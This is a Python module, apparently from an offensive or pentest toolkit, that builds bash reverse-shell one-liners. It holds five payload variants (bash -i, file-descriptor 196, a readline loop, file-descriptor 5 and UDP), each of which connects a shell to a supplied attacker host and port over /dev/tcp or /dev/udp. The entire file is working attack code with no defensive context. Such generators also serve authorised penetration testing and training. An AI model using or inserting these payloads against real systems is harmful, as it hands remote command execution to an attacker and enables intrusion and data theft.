import logging

from enum import Enum
from typing import Optional, Dict

logger = logging.getLogger(__name__)

class BashPayloadType(Enum):
    BASH_I = 0
    BASH_196 = 1
    BASH_READLINE = 2
    BASH_5 = 3
    BASH_UDP = 4

def generate_reverse_shell(
    lhost: str,
    lport: int,
    bash_path: str = "/bin/bash",
    payload_type: BashPayloadType = BashPayloadType.BASH_I,
) -> Optional[str]:

    payload: Optional[str] = None

    match payload_type:
        case BashPayloadType.BASH_I:
            payload = generate_bash_i_payload(lhost, lport, bash_path)
        case BashPayloadType.BASH_196:
            payload = generate_bash_196_payload(lhost, lport, bash_path)
        case BashPayloadType.BASH_READLINE:
            payload = generate_bash_readline_payload(lhost, lport, bash_path)
        case BashPayloadType.BASH_5:
            payload = generate_bash_5_payload(lhost, lport, bash_path)
        case BashPayloadType.BASH_UDP:
            payload = generate_bash_udp_payload(lhost, lport, bash_path)
        case _:
            logger.error("unknown bash payload type")
            pass

    return payload

def generate_bash_i_payload(
    lhost: str,
    lport: int,
    bash_path: str,
) -> str:
    return f"{bash_path} -i >& /dev/tcp/{lhost}/{lport} 0>&1"

def generate_bash_196_payload(
    lhost: str,
    lport: int,
    bash_path: str,
) -> str:
    return f"0<&196;exec 196<>/dev/tcp/{lhost}/{lport}; {bash_path} <&196 >&196 2>&196"

def generate_bash_readline_payload(
    lhost: str,
    lport: int,
    bash_path: str, # unsed 
) -> str:
    return f"exec 5<>/dev/tcp/{lhost}/{lport};cat <&5 | while read line; do $line 2>&5 >&5; done"

def generate_bash_5_payload(
    lhost: str,
    lport: int,
    bash_path: str,
) -> str:
    return f"{bash_path} -i 5<> /dev/tcp/{lhost}/{lport} 0<&5 1>&5 2>&5"

def generate_bash_udp_payload(
    lhost: str,
    lport: int,
    bash_path: str,
) -> str:
    return f"{bash_path} -i >& /dev/udp/{lhost}/{lport} 0>&1"
